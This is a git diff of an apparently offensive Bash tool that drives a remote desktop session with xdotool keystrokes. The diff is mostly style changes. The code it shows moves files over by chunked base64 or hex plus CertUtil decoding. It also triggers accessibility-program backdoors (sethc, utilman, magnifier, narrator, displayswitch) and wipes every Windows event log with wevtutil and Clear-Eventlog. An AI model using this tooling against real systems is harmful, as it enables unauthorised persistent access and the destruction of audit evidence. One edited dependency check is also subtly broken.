@@ -3,10 +3,10 @@
 # TODO: Add check for xfreerdp-x11 and xtightvncviewer. Also do some checks with supported package managers.
 
 function check_dependencies() {
-    if ! which xdotool &>/dev/null
+    if [[ ! $(which xdotool &>/dev/null) ]]
     then
         print_status "warning" "Installing missing dependency..."
-        if [[ ! $(which sudo 2>/dev/null) || $UID -ne 0 ]]
+        if [[ ! $(which sudo 2>/dev/null) || "${EUID}" -ne 0 ]]
         then
             apt install -y xdotool
         else
@@ -44,19 +44,19 @@ function XDoToolInput {
     local input="${1}"
     local key="${2}"
 
-    if [ "${key}" = "return" ]
+    if [[ "${key}" = "return" ]]
     then
         xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type "${input}"
         xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
-	elif [ "${key}" = "escapechars" ]
+	elif [[ "${key}" = "escapechars" ]]
 	then
 		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
 		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
-    elif [ "${key}" = "copycon" ]
+    elif [[ "${key}" = "copycon" ]]
     then
         xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
         xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Ctrl+Z Return
-    elif [ "${key}" = "customkey" ]
+    elif [[ "${key}" = "customkey" ]]
     then
         xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key "${input}"
     fi
@@ -82,7 +82,7 @@ function LinesOfLength {
 
     while read -r line
     do
-        ((counter++))
+        (( counter++ ))
     done < "${file}"
 
     echo "${counter}"
@@ -134,7 +134,7 @@ function DialogBox {
     local commands="${1}"
 
     print_status "progress" "Checking one of the lines reaches 260 character limit"
-    if [ "${#commands}" -ge 260 ]
+    if [[ "${#commands}" -ge 260 ]]
     then
         print_status "error" "Character Limit reached! Terminating program."
         exit 1
@@ -213,13 +213,9 @@ function Base64 {
     local chunks=100
     local base64_data
 
-    local random1
-    local random2
-    local random3
-
-    random1=$(RandomString)
-    random2=$(RandomString)
-    random3=$(RandomString)
+    local random1=$(RandomString)
+    local random2=$(RandomString)
+    local random3=$(RandomString)
 
     # TODO: Implement encryption method through base64 with -b,--bypass flag
     # iconv -t UTF-16LE file.txt | gzip -c | openssl enc -a -e -A
@@ -239,7 +235,7 @@ function Base64 {
 
         print_status "progress" "Transferring file..."
 
-        for ((i=0; i<${#data}; i+=chunks))
+        for (( i=0; i<${#data}; i+=chunks ))
         do
             if [[ i -eq 0 ]]
             then
@@ -257,7 +253,7 @@ function Base64 {
     then
         base64_data=$(basenc -w 0 --base64 "${input}")
 
-        for ((i=0; i<${#data}; i+=chunks))
+        for (( i=0; i<${#data}; i+=chunks ))
         do
             if [[ ${i} -eq 0 ]]
             then
@@ -281,13 +277,9 @@ function Bin2Hex {
     local data
     local chunks=100
 
-    local random1
-    local random2
-    local random3
-
-    random1=$(RandomString)
-    random2=$(RandomString)
-    random3=$(RandomString)
+    local random1=$(RandomString)
+    local random2=$(RandomString)
+    local random3=$(RandomString)
 
     if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
     then
@@ -304,16 +296,16 @@ function Bin2Hex {
 
     # Same applies to cmd.exe using batch scripting
 
-    if [ -f "${input}" ]
+    if [[ -f "${input}" ]]
     then
     	data=$(basenc -w 0 --base16 "${input}")
 
-    	if [ "${mode}" = "powershell" ]
+    	if [[ "${mode}" = "powershell" ]]
     	then
     		echo "Powershell bin2hex (pwshhex)"
-        elif [ "${mode}" = "certutil" ]
+        elif [[ "${mode}" = "certutil" ]]
         then
-            if [ "${platform}" != "windows" ]
+            if [[ "${platform}" != "windows" ]]
             then
                 print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
                 print_status "information" "Use 'nixhex' as a method instead."
@@ -323,12 +315,12 @@ function Bin2Hex {
 
             echo "Command Prompt bin2hex (cmdhex)"
 
-    	elif [ "${mode}" = "console" ]
+    	elif [[ "${mode}" = "console" ]]
     	then
     		echo "Unix bin2hex (nixhex)"
     	fi
 
-		for ((i=0; i<${#data}; i+=chunks))
+		for (( i=0; i<${#data}; i+=chunks ))
 		do
 		    if [[ ${i} -eq 0 ]]
 		    then
@@ -350,8 +342,7 @@ function PowershellOutFile {
     local data
     local chunks=100
 
-    local random_temp
-    random_temp=$(RandomString)
+    local random_temp=$(RandomString)
 
     if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
     then
@@ -360,9 +351,9 @@ function PowershellOutFile {
         exit 1
     fi
 
-    if [ -f "${input}" ]
+    if [[ -f "${input}" ]]
     then
-        if [ "${mode}" = "text" ]
+        if [[ "${mode}" = "text" ]]
         then
             file_type=$(file "${input}")
             if [[ "${file_type}" == *"ASCII text"* ]]
@@ -371,7 +362,7 @@ function PowershellOutFile {
                 while read -r line
                 do
                     length=${#line}
-                    if [ "${length}" -ge 3477 ]
+                    if [[ "${length}" -ge 3477 ]]
                     then
                         print_status "error" "Character Limit reached!"
                         print_status "information" "Use 'outfileb64' as a method instead."
@@ -395,11 +386,11 @@ function PowershellOutFile {
             fi
 
 
-        elif [ "${mode}" = "base64" ]
+        elif [[ "${mode}" = "base64" ]]
         then
             chunks=64
 
-            if [ "${platform}" != "windows" ]
+            if [[ "${platform}" != "windows" ]]
             then
                 print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
                 print_status "information" "Use 'nixb64' as a method instead."
@@ -412,7 +403,7 @@ function PowershellOutFile {
             XDoToolInput "@'" "escapechars"
             XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
 
-	        for ((i=0; i<${#base64_data}; i+=chunks))
+	        for (( i=0; i<${#base64_data}; i+=chunks ))
 	        do
 	            if [[ ${i} -eq 0 ]]
 	            then
@@ -432,7 +423,7 @@ function PowershellOutFile {
             XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
 
             XDoToolInput "Remove-Item -Force ${random_temp}.txt" "return"
-        elif [ "${mode}" = "hex" ]
+        elif [[ "${mode}" = "hex" ]]
         then
             data=$(basenc -w 0 --base16 "${input}")
             # in columns with spaces , without the characters and the addresses
@@ -461,7 +452,7 @@ function CopyCon {
     local random_temp
     random_temp=$(RandomString)
 
-    if [ "${platform}" != "windows" ]
+    if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "copycon only exists on Windows operating system user!"
         print_status "information" "Use 'pwshb64' as a method instead."
@@ -474,7 +465,7 @@ function CopyCon {
         print_status "progress" "Checking one of the lines reaches 255 character limit"
         while read -r line
         do
-            if [ "${#line}" -ge 255 ]
+            if [[ "${#line}" -ge 255 ]]
             then
                 print_status "error" "Character Limit reached!"
                 print_status "information" "Use 'cmdb64' as a method instead."
@@ -490,7 +481,7 @@ function CopyCon {
         counter=1
         while read -r line
         do
-            if [ "${counter}" -ne "${lines_of_length}" ]
+            if [[ "${counter}" != "${lines_of_length}" ]]
             then
                 XDoToolInput "${line}" "return"
             else
@@ -498,7 +489,7 @@ function CopyCon {
             fi
             ((counter++))
         done < "${input}"
-    elif [ "${mode}" = "base64" ]
+    elif [[ "${mode}" = "base64" ]]
     then
         chunks=64
         file_type=$(file "${input}")
@@ -514,7 +505,7 @@ function CopyCon {
         XDoToolInput "copy con ${random_temp}.txt" "return"
         XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
 
-        for ((i=0; i<${#string_base64}; i+=chunks))
+        for (( i=0; i<${#string_base64}; i+=chunks ))
         do
             if [[ i -eq 0 ]]
             then
@@ -532,7 +523,7 @@ function CopyCon {
         XDoToolInput "-----END CERTIFICATE-----" "copycon"
         XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt ${output_file}" "return"
         XDoToolInput "del /f ${random_temp}.txt" "return"
-    elif [ "${mode}" = "hex" ]
+    elif [[ "${mode}" = "hex" ]]
     then
         data=$(basenc -w 0 --base16 "${input}")
         chunks=100
@@ -559,15 +550,15 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "${platform}" = "windows" ]
+    if [[ "${platform}" = "windows" ]]
     then
         echo "Windows"
-    elif [ "${platform}" = "linux" ]
+    elif [[ "${platform}" = "linux" ]]
     then
         echo "Linux"
     fi
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
     else
@@ -584,16 +575,16 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "${platform}" != "windows" ]
+    if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "backdoor" ]
+    elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
         XDoToolInput "shift shift shift shift shift" "customkey"
@@ -612,16 +603,16 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "${platform}" != "windows" ]
+    if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "backdoor" ]
+    elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
         XDoToolInput "Super+u" "customkey"
@@ -640,16 +631,16 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "${platform}" != "windows" ]
+    if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "backdoor" ]
+    elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
         XDoToolInput "Super+equal" "customkey"
@@ -669,16 +660,16 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "${platform}" != "windows" ]
+    if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "backdoor" ]
+    elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
         XDoToolInput "Super+Return" "customkey"
@@ -697,16 +688,16 @@ EndOfText
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ "${platform}" != "windows" ]
+    if [[ "${platform}" != "windows" ]]
     then
         print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "backdoor" ]
+    elif [[ "${mode}" = "backdoor" ]]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
         XDoToolInput "Super+p" "customkey"
@@ -766,13 +757,13 @@ function WevUtil {
 Fill in the description of the technique
 EndOfText
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "quick" ]
+    elif [[ "${mode}" = "quick" ]]
     then
         Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [ "${mode}" = "full" ]
+    elif [[ "${mode}" = "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
@@ -788,13 +779,13 @@ function WinEvent {
 Fill in the description of the technique
 EndOfText
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         echo "${description}"
-    elif [ "${mode}" = "quick" ]
+    elif [[ "${mode}" = "quick" ]]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
-    elif [ "${mode}" = "full" ]
+    elif [[ "${mode}" = "full" ]]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
@@ -810,7 +801,7 @@ function EventViewer {
 Fill in the description of the technique
 EndOfText
 
-    if [ "${mode}" = "info" ]
+    if [[ "${mode}" = "info" ]]
     then
         # TODO: Include information of this technique
         echo ""
@@ -979,7 +970,7 @@ function main() {
     fi
 
     # Executing commands
-    if [ -f "${COMMAND}" ]
+    if [[ -f "${COMMAND}" ]]
     then
         # Check if a file is passed as input
         CmdFile "${COMMAND}"
